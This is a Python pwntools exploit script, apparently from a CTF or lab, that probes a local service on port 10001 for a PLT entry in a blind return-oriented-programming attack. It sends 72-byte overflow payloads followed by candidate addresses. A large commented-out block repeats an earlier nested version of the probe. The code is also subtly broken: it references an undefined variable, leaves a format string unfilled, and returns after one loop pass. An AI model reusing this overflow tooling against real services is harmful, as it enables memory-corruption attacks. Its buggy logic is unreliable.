from pwn import *

def get_plt(size = 72, start_addr = 0x400545, stop_addr = 0x400545, depth = 3):
    
    # start from the first stop gadget
    probe = start_address
    stop = stop_addr
    trap = 0x000000
    
    while 1:
        log.info("Testing 0x%x" % probe)
        for i in range(depth):
            payload = size * b'A'
            payload += p64(probe + i * 16)
            payload += p64(stop)
            payload += p64(trap)
            
            try:
                p = remote('127.0.0.1', 10001, timeout = 2)
                p.recvline()
                p.sendline(payload)
                p.recvline()
                p.close()
                log.info("Trial %d succeeded!")
            except EOFError:
                p.close()
                log.info("Trial %d failed!" % i)
                probe += 1
                break
            except Exception:
                p.close()
                log.info("Bad connection!")
                i -= 1
        log.info("PLT found!")
        return probe

plt_addr = get_plt()
print("The plt entry address is 0x%x" % plt_addr)
            
            
#         try:
#             payload = size * b'A'
#             payload += p64(probe)

#             p = remote('127.0.0.1', 10001, timeout = 2)
#             p.recvline()
#             p.sendline(payload)
#             p.recvline()
#             p.close() 
            
#             try:
#                 payload = size * b'A'
#                 payload += p64(probe + 16)
    
#                 p = remote('127.0.0.1', 10001, timeout = 2)
#                 p.recvline()
#                 p.sendline(payload)
#                 p.recvline()
#                 p.close()
                
#                 try:
#                     payload = size * b'A'
#                     payload += p64(probe + 16 * 2)

#                     p = remote('127.0.0.1', 10001, timeout = 2)
#                     p.recvline()
#                     p.sendline(payload)
#                     p.recvline()
#                     p.close()
#                     log.info("PLT entry found!")
#                     return probe

#                 except EOFError:
#                     p.close()
#                     log.info("Third failed!")
#                     probe += 1

#                 except Exception:
#                     log.info("Bad Connection!")
#                     p.close()
            
#             except EOFError:
#                 p.close()
#                 log.info("Second failed!")
#                 probe += 1
            
#             except Exception:
#                 log.info("Bad Connection!")
#                 p.close()

#         except EOFError:
#             p.close()
#             log.info("First failed!")
#             probe += 1
        
#         except Exception:
#             log.info("Bad Connection!")
#             p.close()


    